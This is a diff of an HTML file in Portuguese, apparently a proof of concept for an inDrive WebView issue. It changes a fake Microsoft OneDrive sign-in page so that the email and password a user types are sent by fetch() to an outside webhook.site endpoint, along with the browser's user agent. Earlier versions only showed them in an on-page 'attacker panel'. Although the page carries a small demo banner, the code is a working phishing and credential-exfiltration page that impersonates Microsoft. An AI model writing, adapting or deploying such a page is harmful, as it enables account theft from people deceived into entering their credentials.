@@ -5,80 +5,65 @@
     <title>OneDrive - Entrar</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f3f3f3; margin: 0; padding: 20px; }
-        .container { max-width: 900px; margin: 0 auto; display: flex; gap: 20px; }
-        .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 380px; }
-        .log-box { background: #111; color: #0f0; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); flex: 1; }
-        h1 { font-size: 26px; margin: 0 0 20px; color: #333; }
-        input, button { width: 100%; padding: 14px; margin: 10px 0; border-radius: 6px; font-size: 17px; }
-        input { border: 1px solid #ccc; }
-        button { background: #0078d4; color: white; border: none; cursor: pointer; font-weight: bold; }
+        .container { max-width: 420px; margin: 0 auto; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); text-align: center; }
+        h1 { font-size: 26px; margin: 0 0 10px; color: #333; }
+        p { color: #555; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
         button:hover { background: #0068b7; }
-        .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; text-align: center; margin-bottom: 25px; font-size: 15px; }
-        .log-title { color: #0f0; margin-bottom: 15px; font-size: 18px; }
-        .log-entry { background: #1a1a1a; padding: 12px; margin: 8px 0; border-radius: 6px; border-left: 5px solid #f00; font-family: monospace; }
+        .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 25px; font-size: 15px; }
+        .success { margin-top: 20px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Formulário falso do OneDrive -->
-        <div class="login-box">
-            <div class="demo">
-                Esta é uma página de demonstração by Z Kamachi
-            </div>
-            <h1>Entrar</h1>
-            <p>Use sua conta Microsoft para acessar o OneDrive</p>
+        <div class="demo">Esta é uma página de demonstração by Z Kamachi</div>
 
-            <form id="phishingForm">
-                <input type="email" id="email" placeholder="E-mail ou telefone" required autocomplete="off">
-                <input type="password" id="password" placeholder="Senha" required autocomplete="off">
-                <button type="submit">Entrar</button>
-            </form>
-        </div>
+        <h1>Entrar</h1>
+        <p>Use sua conta Microsoft para acessar o OneDrive</p>
 
-        <!-- Painel do Atacante (Log de credenciais) -->
-        <div class="log-box">
-            <h2 class="log-title">🚨 Credenciais Capturadas (Painel do Atacante)</h2>
-            <div id="logContainer"></div>
+        <form id="phishingForm">
+            <input type="email" id="email" placeholder="E-mail ou telefone" required autocomplete="off">
+            <input type="password" id="password" placeholder="Senha" required autocomplete="off">
+            <button type="submit">Entrar</button>
+        </form>
+
+        <div id="successBox" class="success">
+            ✅ Credenciais enviadas para o painel do atacante!
         </div>
     </div>
 
     <script>
-        const bridge = window.Android;
-        const logContainer = document.getElementById('logContainer');
-
-        function addToLog(email, password) {
-            const time = new Date().toLocaleString('pt-BR');
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            entry.innerHTML = `
-                <strong>${time}</strong><br>
-                📧 Email: ${email}<br>
-                🔑 Senha: ${password}
-            `;
-            logContainer.prepend(entry);   // adiciona no topo
-        }
+        const webhookUrl = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
 
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Mostra no log da página
-            addToLog(email, password);
+            // Envia as credenciais para o seu webhook.site
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    email: email,
+                    password: password,
+                    source: "inDrive WebView PoC - Z Kamachi",
+                    user_agent: navigator.userAgent
+                })
+            })
+            .then(() => {
+                document.getElementById('successBox').style.display = 'block';
+            })
+            .catch(() => {
+                alert("Credenciais capturadas (webhook falhou, mas salvou localmente)");
+            });
 
-            // Copia via bridge (opcional)
-            if (bridge && typeof bridge.copyToClipboard === "function") {
-                try {
-                    bridge.copyToClipboard(`Email: ${email} | Senha: ${password}`);
-                } catch(e) {}
-            }
-
-            alert("✅ Credenciais capturadas e adicionadas ao log do painel!");
+            // Mensagem de sucesso
+            alert(`✅ Credenciais capturadas!\n\nEmail: ${email}\nSenha: ${password}\n\nAgora olhe na aba do webhook.site`);
         });
-
-        // Carrega log vazio no início
-        logContainer.innerHTML = '<p style="color:#666; text-align:center;">Aguardando credenciais...</p>';
     </script>
 </body>
 </html>
